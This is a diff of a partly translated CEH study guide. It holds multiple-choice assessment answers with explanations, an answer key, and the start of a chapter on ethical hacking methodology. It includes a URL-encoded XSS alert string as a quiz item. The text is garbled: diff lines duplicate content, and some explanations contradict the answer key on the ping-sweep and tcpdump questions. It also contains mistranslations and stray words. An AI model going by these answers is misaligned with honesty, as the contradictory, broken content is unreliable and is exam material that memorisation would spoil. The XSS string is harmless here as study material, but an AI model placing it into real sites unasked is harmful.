+    1. [Base64 encoding]是错误的，Base64 使用 64 个字符的字母数字和符号集合。
+    2. [URL encoding]是正确的，这是典型的百分比编码形式。
+    3. [Encryption]是错误的，加密会产生不可读的二进制或 Base64 形式，而非 `%` 形式。
+    4. [Cryptographic hashing]是错误的，哈希值是固定长度的二进制或十六进制字符串，不会出现 `%` 编码。
 
-1. [A worm uses polymorphic code]是错误的，蠕虫不一定使用多态代码。
+13. 运行 `dig ns domain.com` 会查询 `域名系统（DNS）名称服务器（NS）记录`，返回该域名的 `名称服务器（Name server）记录`。
 
-2. [A virus uses polymorphic code]是错误的，虽然病毒可能使用多态代码，但这并不是两者的根本区别。
+    1. [Mail exchanger records for domain.com]是错误的，那是 MX 记录。
+    2. [Name server records for domain.com]是正确的，dig ns 会返回 NS 记录。
+    3. [Caching name server for domain.com]是错误的，dig 本身不返回缓存信息。
+    4. [IP address for the hostname ns]是错误的，dig ns 返回的是域名对应的名称服务器，而不是 IP。
 
-3. [A worm can self‑propagate]是正确的，蠕虫能够自行在网络中传播。
+14. 理想情况下用于获取域名所有主机名的技术是 `区域传输（Zone transfer）`，即从主 DNS 服务器将整个区域的记录复制到从属服务器。
 
-4. [A virus can self‑propagate]是错误的，病毒需要借助其他程序或文件传播。
+    1. [DNS query]是错误的，普通查询只能获取单个主机名。
+    2. [Zone copy]是错误的，这通常指手动复制区域文件，而不是自动传输。
 
-8. 计算风险的常用公式是 **Probability × Loss**（即概率乘以潜在损失）。
 
-1. [Probability * loss]是正确的。
 
-2. [Probability * mitigation factor]是错误的，因为它引入了缓解因子，而不是直接的损失。
+### 3. Zone transfer
+[Zone transfer]是正确的，它允许获取完整的区域记录。
 
-3. [(Loss + mitigation factor) * (loss/probability)]是错误的，公式不合逻辑。
+### 4. Recursive request
+[Recursive request]是错误的，普通递归查询只返回域名对应的记录，而非全部主机名。
 
-4. [Loss * mitigation factor]是错误的，缺少概率因子。
-
-9. 恶意双子（evil twin）攻击的工作方式是 **冒充合法的无线接入点（AP）**，诱骗用户连接到攻击者控制的 AP，从而可以拦截或篡改流量。
-
-1. [Phishing users for credentials]是错误的，这是钓鱼攻击，不是双子攻击。
-
-2. [Spoofing an SSID]是正确的，攻击者伪装 AP 的 SSID 以误导用户。
-
-3. [Changing an SSID]是错误的，单纯更改 SSID 并不能实现双子攻击。
-
-4. [Injecting four‑way handshakes]是错误的，这与攻击的核心机制无关。
-
-10. 在端点之前、网络层面清除恶意软件的常用手段是 **统一威胁管理（Unified threat management）设备**。
-
-1. [Antivirus]是错误的，它主要在终端层面工作。
-
-2. [Application layer gateway]是错误的，它主要处理应用层流量，而非网络层恶意软件清除。
-
-3. [Unified threat management appliance]是正确的，它集成了防火墙、入侵防御等功能，可在网络层面阻断恶意软件。
-
-4. [Stateful firewall]是错误的，它只能基于连接状态过滤流量，无法主动清除恶意软件。
-
-11. 安全策略的主要目的是 **为安全提供高层次的指导**，帮助组织制定整体的安全方针和原则。
-
-1. [Providing high‑level guidance on the role of security]是正确的。
-
-2. [Providing specific direction to security workers]是错误的，这是详细操作指南，而非策略的主要目的。
-
-3. [Increasing the bottom line of a company]是错误的，安全策略的核心不是财务增长。
-
-4. [Aligning standards and practices]是错误的，虽然对齐很重要，但不是策略的首要目的。
-
-12. 给定的字符串 **%3Cscript%3Ealert('wubble');%3C/script%3E** 是 **URL 编码**（percent‑encoding）后的形式，其中 `%3C` 代表 `<`，`%3E` 代表 `>`，`%3E` 后面的部分是被编码的脚本代码。
-
-1. [Base64 encoding]是错误的，Base64 使用 64 个字符的字母数字和符号集合。
-
-2. [URL encoding]是正确的，这是典型的百分比编码形式。
-
-3. [Encryption]是错误的，加密会产生不可读的二进制或 Base64 形式，而非 `%` 形式。
-
-4. [Cryptographic hashing]是错误的，哈希值是固定长度的二进制或十六进制字符串，不会出现 `%` 编码。
-
-13. 运行 `dig ns domain.com` 会查询 **域名系统（DNS）名称服务器（NS）记录**，返回该域名的 **名称服务器（Name server）记录**。
-
-1. [Mail exchanger records for domain.com]是错误的，那是 MX 记录。
-
-2. [Name server records for domain.com]是正确的，dig ns 会返回 NS 记录。
-
-3. [Caching name server for domain.com]是错误的，dig 本身不返回缓存信息。
-
-4. [IP address for the hostname ns]是错误的，dig ns 返回的是域名对应的名称服务器，而不是 IP。
-
-14. 理想情况下用于获取域名所有主机名的技术是 **区域传输（Zone transfer）**，即从主 DNS 服务器将整个区域的记录复制到从属服务器。
-
-1. [DNS query]是错误的，普通查询只能获取单个主机名。
-
-2. [Zone copy]是错误的，这通常指手动复制区域文件，而不是自动传输。
-
-3. [Zone transfer]是正确的，它允许获取完整的区域记录。
-
-4. [Recursive request]是错误的，普通递归查询只返回域名对应的记录，而非全部主机名。
-
-15. 在数据包捕获中看到 **操作系统命令** 包含在 DNS 查询中，最可能的情况是 **隧道攻击（Tunneling attack）**，攻击者将非 DNS 的二进制数据封装在 DNS 报文中进行传输。
+### 15. 隧道攻击
+在数据包捕获中看到 `操作系统命令` 包含在 DNS 查询中，最可能的情况是 `隧道攻击（Tunneling attack）`，攻击者将非 DNS 的二进制数据封装在 DNS 报文中进行传输。
 
 1. [Tunneling attack]是正确的。
-
 2. [DNS amplification]是错误的，它是指利用 DNS 服务器放大流量的攻击。
-
 3. [DNS recursion]是错误的，它是 DNS 服务器内部的查询机制。
-
 4. [XML entity injection]是错误的，它针对 XML 解析器，与 DNS 无关。
 
-16. 运行 **ping sweep**（ICMP echo sweep）的目的是 **在不进行端口扫描的情况下识别哪些主机是响应的**。
+### 16. Ping sweep 目的
+运行 `ping sweep`（ICMP echo sweep）的目的是 `在不进行端口扫描的情况下识别哪些主机是响应的`。
 
 1. [You want to identify responsive hosts without a port scan]是正确的。
-
 2. [You want to use something that is light on network traffic]是错误的，ping sweep 本身会产生大量 ICMP 包。
-
 3. [You want to use a protocol that may be allowed through the firewall]是错误的，ICMP 通常被防火墙阻断或受限。
-
 4. [All of the above]是错误的，因为只有第一项是正确的。
 
-17. 根据 NIST 网络安全框架（NIST Cybersecurity Framework），其核心功能（Framework Functions）包括 **Identify、Protect、Detect、Respond、Recover**，共 **5** 个功能。
+### 17. NIST 网络安全框架
+根据 NIST 网络安全框架（NIST Cybersecurity Framework），其核心功能（Framework Functions）包括 `Identify`、`Protect`、`Detect`、`Respond`、`Recover`，共 `5` 个功能。
 
 1. [0]是错误的。
-
 2. [3]是错误的。
-
 3. [5]是正确的。
-
 4. [4]是错误的。
 
-18. 不写恶意软件的一个原因是 **Python 解释器可能不存在于目标系统上**。
+### 18. 不写恶意软件的原因
+不写恶意软件的一个原因是 `Python 解释器可能不存在于目标系统上`。
 
 1. [The Python interpreter is slow]是错误的，Python 解释器的性能不是主要考虑因素。
-
 2. [The Python interpreter may not be available]是正确的。
-
 3. [There is inadequate library support]是错误的，Python 拥有丰富的第三方库。
-
 4. [Python is a hard language to learn]是错误的，Python 以易学著称。
 
-19. 命令 `tcpdump -i eth2 host 192.168.10.5` 捕获的是 **仅来自 192.168.10.5 的流量**（即源地址为该 IP 的包）。
+### 19. tcpdump 命令
+命令 `tcpdump -i eth2 host 192.168.10.5` 捕获的是 `仅来自 192.168.10.5 的流量`（即源地址为该 IP 的包）。
 
 1. [Traffic just from 192.168.10.5]是正确的。
-
 2. [Traffic to and from 192.168.10.5]是错误的，因为只限定了源地址。
-
 3. [Traffic just to 192.168.10.5]是错误的，因为只限定了目的地址。
-
 4. [All traffic other than from 192.168.10.5]是错误的，与捕获条件相反。
 
-20. Diffie‑Hellman 协议主要用于 **密钥交换（Key exchange）**，使两方安全地协商共享密钥。
+### 20. Diffie-Hellman 协议
+Diffie‑Hellman 协议主要用于 `密钥交换（Key exchange）`，使两方安全地协商共享密钥。
 
 1. [Key management]是错误的，它涉及密钥的生成、分发、存储和撤销，而非交换。
-
 2. [Key isolation]是错误的，与密钥交换无关。
-
 3. [Key exchange]是正确的。
-
 4. [Key revocation]是错误的，撤销是后续管理步骤。
 
-21. 社会工程学中的 **权威（Authority）** 原则可以让假扮帮助台的电话更容易被接受。
+### 21. 社会工程学权威原则
+社会工程学中的 `权威（Authority）` 原则可以让假扮帮助台的电话更容易被接受。
 
 1. [Social proof]是错误的，它基于他人行为的认可。
-
 2. [Imitation]是错误的，它强调模仿而非权威。
-
 3. [Scarcity]是错误的，它基于稀缺性。
-
 4. [Authority]是正确的。
 
-22. SNMPv1 使用 **公共字符串（Community string）** 进行身份验证。
+### 22. SNMPv1 身份验证
+SNMPv1 使用 `公共字符串（Community string）` 进行身份验证。
 
 1. [Username/password]是错误的，SNMPv1 不支持用户名和密码。
-
 2. [Hash]是错误的，SNMPv1 没有哈希验证。
-
-3. [Public string]是错误的，虽然有时会被误称为 “public string”，但标准术语是 “community string”。
-
+3. [Public string]是错误的，虽然有时会被误称为 `public string`，但标准术语是 `community string`。
 4. [Community string]是正确的。
 
-23. Java 程序在网络中共享过程时，使用 **RMI 注册表（RMI registry）** 来注册和查找远程对象。
+### 23. Java RMI 注册表
+Java 程序在网络中共享过程时，使用 `RMI 注册表（RMI registry）` 来注册和查找远程对象。
 
 1. [RMI registry]是正确的。
-
 2. [RMI mapper]是错误的，不存在此术语。
-
 3. [RMI database]是错误的，没有此概念。
-
 4. [RMI process]是错误的，RMI 与进程无直接关系。
 
-24. 一个 **没有对应的 ARP 请求** 的 ARP 响应称为 ** gratuitous ARP**（ gratuitous response）。
+### 24. Gratuitous ARP
+一个 `没有对应的 ARP 请求` 的 ARP 响应称为 `gratuitous ARP`（gratuitous response）。
 
 1. [Is‑at response]是错误的。
-
 2. [Who‑has ARP]是错误的。
-
 3. [Gratuitous ARP]是正确的。
-
 4. [IP response]是错误的。
 
-25. 文件元数据中通常存储的三个时间点是 **修改时间（Modified）**、**访问时间（Accessed）**、**创建时间（Created）**。
+### 25. 文件元数据时间点
+文件元数据中通常存储的三个时间点是 `修改时间（Modified）`、`访问时间（Accessed）`、`创建时间（Created）`。
 
 1. [Moves, adds, changes]是错误的。
-
 2. [Modified, accessed, deleted]是错误的，缺少创建时间且包含删除时间。
-
 3. [Moved, accessed, changed]是错误的。
-
 4. [Modified, accessed, created]是正确的。
 
-26. 使用本地漏洞的 **特权提升（Privilege escalation）** 是最常见的原因。
+### 26. 特权提升
+使用本地漏洞的 `特权提升（Privilege escalation）` 是最常见的原因。
 
 1. [Pivoting]是错误的，它是利用已获取的权限进行进一步攻击。
-
 2. [Log manipulation]是错误的，与特权提升无关。
-
 3. [Privilege escalation]是正确的。
-
 4. [Password collection]是错误的，与特权提升无直接关联。
 
-27. 为了证明 **签名消息** 确实来自拥有私钥的所有者，使用 **非否认性（Nonrepudiation）** 原则。
+### 27. 非否认性原则
+为了证明 `签名消息` 确实来自拥有私钥的所有者，使用 `非否认性（Nonrepudiation）` 原则。
 
 1. [Nonrepudiation]是正确的。
-
 2. [Nonverifiability]是错误的，这是一个不常用的术语。
-
 3. [Integrity]是错误的，它只保证数据未被篡改，而不保证签名来源。
-
 4. [Authority]是错误的，与签名验证无关。
 
-28. 防御 **尾随（tailgating）** 的可行做法是 **人防（Man traps）**，即在入口处设置物理阻挡，只有持有有效凭证的人才能进入。
+### 28. 防御尾随
+防御 `尾随（tailgating）` 的可行做法是 `人防（Man traps）`，即在入口处设置物理阻挡，只有持有有效凭证的人才能进入。
 
 1. [Biometrics]是错误的，它用于身份验证，但不能阻止尾随。
-
 2. [Badge access]是错误的，它本身不防止尾随。
-
 3. [Phone verification]是错误的，与物理访问控制无关。
-
 4. [Man traps]是正确的。
 
-29. **蓝牙窃听（bluesnarfing）** 比 **蓝牙推送（bluejacking）** 更危险，因为 **蓝牙窃听会接收（接收）数据**，而蓝牙推送只会发送（发送）数据。
+### 29. 蓝牙窃听与蓝牙推送
+`蓝牙窃听（bluesnarfing）` 比 `蓝牙推送（bluejacking）` 更危险，因为 `蓝牙窃听会接收数据`，而蓝牙推送只会发送数据。
 
 1. [Bluejacking sends, while bluesnarfing receives.]是正确的。
-
 2. [Bluejacking receives, while bluesnarfing sends.]是错误的。
-
 3. [Bluejacking installs keyloggers.]是错误的。
-
 4. [Bluesnarfing installs keyloggers.]是错误的。
 
-30. **Biba 安全模型** 关注的是 **完整性（Integrity）**，防止未经授权的提升或降低完整性的操作。
+### 30. Biba 安全模型
+`Biba 安全模型` 关注的是 `完整性（Integrity）`，防止未经授权的提升或降低完整性的操作。
 
 1. [Confidentiality]是错误的。
-
 2. [Integrity]是正确的。
-
 3. [Availability]是错误的。
-
 4. [All of them]是错误的。
 
-**Assessment Test Answers**
+## Assessment Test Answers
 
-1. **B** The destination address is used as the address to send messages to. The don't fragment bit is used to tell network devices not to fragment the packet. The Type of Service (ToS) field can be used to perform quality of service. The IP identification field is used to identify fragments of the same packet, as they would all have the same IP identification number.
+### 1. B
+The destination address is used as the address to send messages to. The don't fragment bit is used to tell network devices not to fragment the packet. The Type of Service (ToS) field can be used to perform quality of service. The IP identification field is used to identify fragments of the same packet, as they would all have the same IP identification number.
 
-2. **C** A SQL injection attack makes use of SQL queries, which can include logic that may alter the flow of the application. In the example provided, the intent is to force the result of the SQL query to always return a true. It is quoted the way it is to escape the existing query already in place in the application. None of the other attacks uses a syntax that looks like the example.
+### 2. C
+A SQL injection attack makes use of SQL queries, which can include logic that may alter the flow of the application. In the example provided, the intent is to force the result of the SQL query to always return a true. It is quoted the way it is to escape the existing query already in place in the application. None of the other attacks uses a syntax that looks like the example.
 
-3. **C** The Apple App Store and the Google Play Store are controlled by Apple and Google. It's not impossible to get malware onto mobile devices that way, but it's very difficult because apps get run through a vetting process. While some Android devices will support external storage, it's not an effective way to get malware onto a smartphone or other mobile device. Jailbreaking can lead to malware being installed, but it's not the means to get malware onto a mobile device. Third‑party app stores can be a good means to get malware onto mobile devices because some third‑party app stores don't vet apps that are submitted.
+### 3. C
+The Apple App Store and the Google Play Store are controlled by Apple and Google. It's not impossible to get malware onto mobile devices that way, but it's very difficult because apps get run through a vetting process. While some Android devices will support external storage, it's not an effective way to get malware onto a smartphone or other mobile device. Jailbreaking can lead to malware being installed, but it's not the means to get malware onto a mobile device. Third‑party app stores can be a good means to get malware onto mobile devices because some third‑party app stores don't vet apps that are submitted.
 
-4. **B** DHCP is used to get IP configuration to endpoints. DNS is used to resolve a hostname to an IP address and vice versa. RARP is the reverse address protocol used to take a MAC address and resolve it to an IP address. ARP is used to resolve an IP address to a MAC address. Communication on a local network requires the use of a MAC address. The IP address is used to get to systems off the local network.
+### 4. B
+DHCP is used to get IP configuration to endpoints. DNS is used to resolve a hostname to an IP address and vice versa. RARP is the reverse address protocol used to take a MAC address and resolve it to an IP address. ARP is used to resolve an IP address to a MAC address. Communication on a local network requires the use of a MAC address. The IP address is used to get to systems off the local network.
 
+### 7. C
+既 `worms` 也 `viruses` 都可以编写使用多态代码，这意味着它们在传播时可以改变外观。`worm` 可以自行传播，这是 `worms` 与 `viruses` 的唯一区别。`viruses` 需要用户进行干预才能传播和执行。
 
+### 8. A
+风险是事件发生的概率乘以损失的金额。没有可量化的缓解因素，因此不能用于风险计算。
 
-7. C. 既 worms 也 viruses 都可以编写使用多态代码，这意味着它们在传播时可以改变外观。worm 可以自行传播，这是 worms 与 viruses 的唯一区别。viruses 需要用户进行干预才能传播和执行。
+### 9. B
+恶意双子攻击使用伪装的接入点，冒充合法的无线网络的连接点。终端尝试连接到该伪装的接入点。虽然可以在恶意双子攻击中钓鱼获取凭据，但凭据钓鱼并不是此类攻击的实现方式。SSID 不会在恶意双子攻击中被修改，这意味着已存在的任何 SSID 都不会变成另一个 SSID。注入四次握手并没有多大作用，因为四次握手假设双方都在通信，注入的完整通信流会被忽略。
 
-8. A. 风险是事件发生的概率乘以损失的金额。没有可量化的缓解因素，因此不能用于风险计算。
+### 10. C
+防病毒解决方案用于终端或可能用于邮件服务器。状态防火墙能够考虑连接的状态——新建、相关、已建立。应用层网关了解应用层协议。统一威胁管理设备在防火墙功能之上增加了包括防病毒在内的能力。
 
-9. B. 恶意双子攻击使用伪装的接入点，冒充合法的无线网络的连接点。终端尝试连接到该伪装的接入点。虽然可以在恶意双子攻击中钓鱼获取凭据，但凭据钓鱼并不是此类攻击的实现方式。SSID 不会在恶意双子攻击中被修改，这意味着已存在的任何 SSID 都不会变成另一个 SSID。注入四次握手并没有多大作用，因为四次握手假设双方都在通信，注入的完整通信流会被忽略。
+### 11. A
+标准和实践应来源于安全策略，这是对组织内安全角色的高层指导。安全通常不会直接提升公司的底线。策略并非提供具体指示，那是程序的作用。
 
-10. C. 防病毒解决方案用于终端或可能用于邮件服务器。状态防火墙能够考虑连接的状态——新建、相关、已建立。应用层网关了解应用层协议。统一威胁管理设备在防火墙功能之上增加了包括防病毒在内的能力。
+### 12. B
+Base64 编码将不可打印字符编码为可在文本中显示的形式。加密通常会使文本对人类不可读。加密散列是生成固定长度值以标识某值的方式。URL 编码使用十六进制表示字符，将文本转换为十六进制以便在 URL 中使用。
 
-11. A. 标准和实践应来源于安全策略，这是对组织内安全角色的高层指导。安全通常不会直接提升公司的底线。策略并非提供具体指示，那是程序的作用。
+### 13. B
+邮件交换记录以 `MX` 记录标识。名称服务器记录以 `ns` 标记。企业可能拥有一个或多个缓存名称服务器，但缓存名称服务器不属于该域，因为它没有任何与域相关的标识。
 
-12. B. Base64 编码将不可打印字符编码为可在文本中显示的形式。加密通常会使文本对人类不可读。加密散列是生成固定长度值以标识某值的方式。URL 编码使用十六进制表示字符，将文本转换为十六进制以便在 URL 中使用。
+### 14. C
+DNS 查询可以根据主机名或 IP 地址相互查找。你可以使用暴力强行技术尝试识别主机名，但该方法可能无法得到全部结果。递归请求通常由缓存服务器向权威服务器发起，以获取完整响应。完整区域内容的术语是区域传输（zone transfer）。
 
-13. B. 邮件交换记录以 MX 记录标识。名称服务器记录以 `ns` 标记。企业可能拥有一个或多个缓存名称服务器，但缓存名称服务器不属于该域，因为它没有任何与域相关的标识。
+### 15. A
+隧道攻击可以用于在一个协议内隐藏另一个协议。这可能用于通过隧道系统发送操作系统命令。DNS 放大攻击是指一次小的 DNS 请求导致 mucho 更大的响应发送到目标。DNS 递归用于从 DNS 服务器查找信息。XML 实体注入是基于 Web 的攻击，不会出现在 DNS 请求中。
 
-14. C. DNS 查询可以根据主机名或 IP 地址相互查找。你可以使用暴力强行技术尝试识别主机名，但该方法可能无法得到全部结果。递归请求通常由缓存服务器向权威服务器发起，以获取完整响应。完整区域内容的术语是区域传输（zone transfer）。
+### 16. D
+进行 ping 掃描可能有多种原因。你可能想识别网络段中可响应的主机。但你可能不想使用完整的端口扫描。ICMP 是轻量级协议，且有可能通过防火墙，因为它用于故障排除和诊断。
 
-15. A. 隧道攻击可以用于在一个协议内隐藏另一个协议。这可能用于通过隧道系统发送操作系统命令。DNS 放大攻击是指一次小的 DNS 请求导致 mucho 更大的响应发送到目标。DNS 递归用于从 DNS 服务器查找信息。XML 实体注入是基于 Web 的攻击，不会出现在 DNS 请求中。
+### 17. C
+NIST 网络安全框架规定了五个功能：识别、保护、检测、响应、恢复。
 
-16. D. 进行 ping 掃描可能有多种原因。你可能想识别网络段中可响应的主机。但你可能不想使用完整的端口扫描。ICMP 是轻量级协议，且有可能通过防火墙，因为它用于故障排除和诊断。
+### 18. B
+Python 解释器的执行速度可能低于编译程序，但差异微乎其微，通常在恶意软件中执行速度不是主要考量。Python 并不难学习，且有大量社区库。一个挑战是你可能需要 Python 解释器，除非你使用 Python 编译器将脚本编译。
 
-17. C. NIST 网络安全框架规定了五个功能：识别、保护、检测、响应、恢复。
+### 19. B
+表达式 `host 192.168.10.5` 在 BPF 中表示 `tcpdump` 只捕获到或来自 192.168.10.5 的数据包。如果你只想捕获到或自该 IP 的流量，需要将 `host` 替换为 `src` 或 `dest`。
 
-18. B. Python 解释器的执行速度可能低于编译程序，但差异微乎其微，通常在恶意软件中执行速度不是主要考量。Python 并不难学习，且有大量社区库。一个挑战是你可能需要 Python 解释器，除非你使用 Python 编译器将脚本编译。
+### 20. C
+证书可以撤销，但这并不是 Diffie‑Hellman 的用途。密钥管理是一个更广泛的主题，而 Diffie‑Hellman 仅用于密钥交换。它允许通信双方在拥有相同的基值的前提下共同派生相同的密钥。
 
-19. B. 表达式 `host 192.168.10.5` 在 BPF 中表示 `tcpdump` 只捕获到或来自 192.168.10.5 的数据包。如果你只想捕获到或自该 IP 的流量，需要将 `host` 替换为 `src` 或 `dest`。
+### 21. D
+虽然你可能在模仿他人，但模仿并不是社会工程学的原则。也不存在社会证明或稀缺性。如果你是帮助台的电话，你可能被视为拥有权威地位。
 
-20. C. 证书可以撤销，但这并不是 Diffie‑Hellman 的用途。密钥管理是一个更广泛的主题，而 Diffie‑Hellman 仅用于密钥交换。它允许通信双方在拥有相同的基值的前提下共同派生相同的密钥。
+### 22. D
+SNMPv3 实现了用户名和密码认证。在版本 1 中，使用明文的 `community` 字符串。SNMP 不使用哈希，虽然常把 `public` 当作 `community` 字符串，但这并不是 SNMPv1 的认证方式。
 
-21. D. 虽然你可能在模仿他人，但模仿并不是社会工程学的原则。也不存在社会证明或稀缺性。如果你是帮助台的电话，你可能被视为拥有权威地位。
+### 23. A
+跨系统的进程间通信称为远程方法调用（RMI）。程序需要与之通信以获取动态端口分配的进程是 `RMI 注册表`。你查询该注册表以识别已在实现 RMI 的系统上可用的服务。
 
-22. D. SNMPv3 实现了用户名和密码认证。在版本 1 中，使用明文的 community 字符串。SNMP 不使用哈希，虽然常把 *public* 当作 community 字符串，但这并不是 SNMPv1 的认证方式。
+### 24. C
+当没有对应的 ARP 请求时发送 ARP 响应，属于意外或不必要的消息，即 `gratuitous ARP`。
 
-23. A. 跨系统的进程间通信称为远程方法调用（RMI）。程序需要与之通信以获取动态端口分配的进程是 RMI 注册表。你查询该注册表以识别已在实现 RMI 的系统上可用的服务。
+### 25. D
+文件元数据常用三个日期时间戳。创建时记录创建瞬间，访问时记录访问瞬间，修改时记录修改瞬间。访问时间不等同于修改时间，因为访问可能是只读的。即使你打开文件但未实际修改，访问时间仍会更新。搬动、添加或更改文件有时称为 MAC（修改、访问、创建），但这些并非与文件时间相关的任务。
 
-24. C. 当没有对应的 ARP 请求时发送 ARP 响应，属于意外或不必要的消息，即 gratuitous ARP。
+### 26. C
+本地漏洞针对的不是网络上监听的应用。这意味着你必须是本地登录的机器用户，而非远程。换句话说，你需要以某种方式登录系统。本地漏洞不需要用于收集密码，因为不需要利用漏洞即可完成此类操作。同样，操纵日志或横向移动也不需要利用漏洞，通常需要提升权限。本地漏洞可以被利用以获取提升权限的优势。
 
-25. D. 文件元数据常用三个日期时间戳。创建时记录创建瞬间，访问时记录访问瞬间，修改时记录修改瞬间。访问时间不等同于修改时间，因为访问可能是只读的。即使你打开文件但未实际修改，访问时间仍会更新。搬动、添加或更改文件有时称为 MAC（修改、访问、创建），但这些并非与文件时间相关的任务。
+### 27. A
+完整性是 CIA 三要素之一，但它并不是将已签名消息与签名证书的主体关联的原则。不可验证性是无意义的，权威性在此不相关。相反，不可否认性（nonrepudiation）意味着签名者不能否认自己发送了该消息，前提是其密钥在其持有且受密码保护。
 
-26. C. 本地漏洞针对的不是网络上监听的应用。这意味着你必须是本地登录的机器用户，而非远程。换句话说，你需要以某种方式登录系统。本地漏洞不需要用于收集密码，因为不需要利用漏洞即可完成此类操作。同样，操纵日志或横向移动也不需要利用漏洞，通常需要提升权限。本地漏洞可以被利用以获取提升权限的优势。
-
-27. A. 完整性是 CIA 三要素之一，但它并不是将已签名消息与签名证书的主体关联的原则。不可验证性是无意义的，权威性在此不相关。相反，不可否认性（nonrepudiation）意味着签名者不能否认自己发送了该消息，前提是其密钥在其持有且受密码保护。
-
-28. D. 生物特征和徽章访问属于物理访问控制。电话验证可能用于验证身份，但不能防止尾随。而“人阱”（man trap）能防止尾随，因为它一次只允许一个人进入。
+### 28. D
+生物特征和徽章访问属于物理访问控制。电话验证可能用于验证身份，但不能防止尾随。而 `人阱（man trap）` 能防止尾随，因为它一次只允许一个人进入。
 
 
 
@@ -1580,9 +1754,9 @@ Table 1.1 显示了在书中何处可以找到每个目标的概览。虽然所�
 
 30. B. `Biba 安全模型` 关注数据完整性。虽然其他模型关注保密性，但没有任何一个模型关注可用性。
 
-# Chapter 1  
+# Chapter 1
 
-Ethical Hacking  
+## Ethical Hacking
 
 Welcome to the exciting world of information security and, specifically, the important world of what is referred to as `ethical hacking` or `penetration testing`. You're here because you want to take the exam that will get you the Certified Ethical Hacker (CEH) certification. Perhaps you have done the training from EC‑Council, the organization that manages the CEH certification, and you want a resource with a different perspective to help you as you prepare for the exam. Or you've decided to go the self‑study route and you have enough experience to qualify for the exam. One way or another, you're here now, and this book will help improve your understanding of the material to prepare for the exam.
 
@@ -1604,8 +1778,6 @@ On the other side, companies that developed software hadn't caught up with the i
 
 For examples of responsible disclosure, look at the work of `Dan Kaminsky`. In the mid‑2000s, he found serious flaws in the implementations of the Domain Name System (DNS), which impacts everyone on the Internet. He worked responsibly with vendors to ensure that they had time to fix their implementations and remediate the vulnerabilities before he disclosed them. In the end, he did disclose the vulnerabilities in a very public manner, but only after vendors had time to fix the issue. This meant he wasn't putting people in the path of compromise and potential information disclosure. Even though he was using the software in a way that it wasn't intended to be used, he was using an ethical approach by attempting to address an issue before someone could make use of the issue in a malicious way.
 
-
-
 在您执行工作时，您将获得由客户或公司提供的资源。根据 EC‑Council 伦理准则，您必须同意其中规定的内容，并且不得滥用您获得的任何设备。您不能损坏在雇佣或合同期间获得访问权限的任何资产。有时，您所进行的测试可能会导致您所服务的公司基础设施的服务受损。只要此类损害是 unintentional（ unintentional）或经公司同意且被认为可接受的，则是可以接受的。缓解此类顾虑的一种方法是随时保持沟通渠道畅通。如果发生意外故障，确保正确的人员知晓并能够快速处理是至关重要的。
 
 也许显而易见的是，在渗透测试期间您不得参与任何非法行为。同样，您也不得拥有任何重罪定罪记录。与此类似，虽然并非直接非法，但您也不能参与任何被视为“黑客”（black hat）的团体，即那些可能从事非法活动的组织，例如为了恶意目的攻击计算机系统。
@@ -1617,6 +1789,8 @@ For examples of responsible disclosure, look at the work of `Dan Kaminsky`. In t
 ## Ethical Hacking Overview
 
 现在，很难在不看到关于数据盗窃、基于互联网的犯罪或针对个人和企业的各种攻击的新闻来源时不去关注这些问题。新闻中看到的其实是大规模的问题，伴随大量记录被 compromise 或大型公司被 breached。您所看不到的是针对个人电脑或其他设备的系统入侵次数。例如，Mirai Botnet 感染了运行嵌入式 Linux 实现的较小、专用设备。被认为已被 compromise 并加入该 Botnet 的设备数量已超过 100,000，甚至可能超过一百万。
+
+
 
 每年都有数百万新的恶意软件被创建，往往利用最近发现的新漏洞。自 2005 年以来，每一年都有至少 1000 万条数据记录被 compromise。2017 年，近 2 亿条记录被 compromise。这些数字仅来自美国。为了说明，美国只有约 2.5 亿成年人，因此可以说每个成年人都多次经历过其信息被 compromise。需要明确的是，这里讨论的数据记录属于个人而非企业。关于被盗知识产权的总价值估算很少，但可以确定这种 compromise 已经持续了很长时间。
 
@@ -1634,14 +1808,11 @@ EC‑Council 通过要求获得 Certified Ethical Hacker（CEH）认证的任何
 
 正如许多事物一样，使用方法论在 ethical hacking 或安全测试中也很有价值。方法论可以帮助实现一致性、可重复性以及流程改进。一致性很重要，因为您希望无论是谁在进行测试，所执行的测试集合都相同。假设您正在为一家公司工作，并且公司经常请您回来进行后续测试。如果没有一致性，您可能会在一次测试中漏掉某些发现，而在另一次测试中发现它们已经不存在，这会让客户产生错误的印象，或者让人误以为该发现根本不存在。这会给公司留下不好的印象。同样，可重复性让您能够每次都运行相同的测试。事实上，如果您与团队合作，每位成员都应能够运行相同的测试集。您希望确保 thele（原文可能为 "the" 或 "all"）能够顺利完成测试。
 
-
-
-
--   [渗透测试执行标准 (PTES)](https://example.org/ptes) 和 [开源安全测试方法手册 (OSSTMM)](https://example.org/osstmm) 是行业中广泛使用的测试或评估方法论，它们通常围绕攻击者会做什么或攻击者如何操作来构建。虽然这些方法可能不能完全映射到现实中的攻击行为，但它们能够确保安全测试的**一致性**和**广度**，从而显得非常有价值。此外，许多常见的安全测试方法论本身就是攻击者操作模式的模型。第一种是**网络杀链 (Cyber Kill Chain)**，另一种是**攻击生命周期 (Attack Life Cycle)**，还有一种是 **MITRE ATT&CK 框架**。当我们研究伦理黑客的方法论时，会发现这些模型与 EC‑Council 所使用的伦理黑客阶段具有相似之处。
+- [渗透测试执行标准 (PTES)](https://example.org/ptes) 和 [开源安全测试方法手册 (OSSTMM)](https://example.org/osstmm) 是行业中广泛使用的测试或评估方法论，它们通常围绕攻击者会做什么或攻击者如何操作来构建。虽然这些方法可能不能完全映射到现实中的攻击行为，但它们能够确保安全测试的`一致性`和`广度`，从而显得非常有价值。此外，许多常见的安全测试方法论本身就是攻击者操作模式的模型。第一种是`网络杀链 (Cyber Kill Chain)`，另一种是`攻击生命周期 (Attack Life Cycle)`，还有一种是 `MITRE ATT&CK 框架`。当我们研究伦理黑客的方法论时，会发现这些模型与 EC‑Council 所使用的伦理黑客阶段具有相似之处。
 
 ### 网络杀链
 
-在信息安全领域，一个常被提及的框架是 **网络杀链**。杀链是一个军事概念，描述攻击的结构。其核心思想是能够识别攻击者在其进程中的位置，从而相应地调整自己的应对策略。国防承包商 **Lockheed Martin** 将军事概念的杀链适配到了信息安全（或网络安全）空间。Figure 1.1 展示了由 Lockheed Martin 开发的网络杀链。
+在信息安全领域，一个常被提及的框架是 `网络杀链`。杀链是一个军事概念，描述攻击的结构。其核心思想是能够识别攻击者在其进程中的位置，从而相应地调整自己的应对策略。国防承包商 `Lockheed Martin` 将军事概念的杀链适配到了信息安全（或网络安全）空间。Figure 1.1 展示了由 Lockheed Martin 开发的网络杀链。
 
 ![FIGURE 1.1 Cyber kill chain](img/c01f001.png)
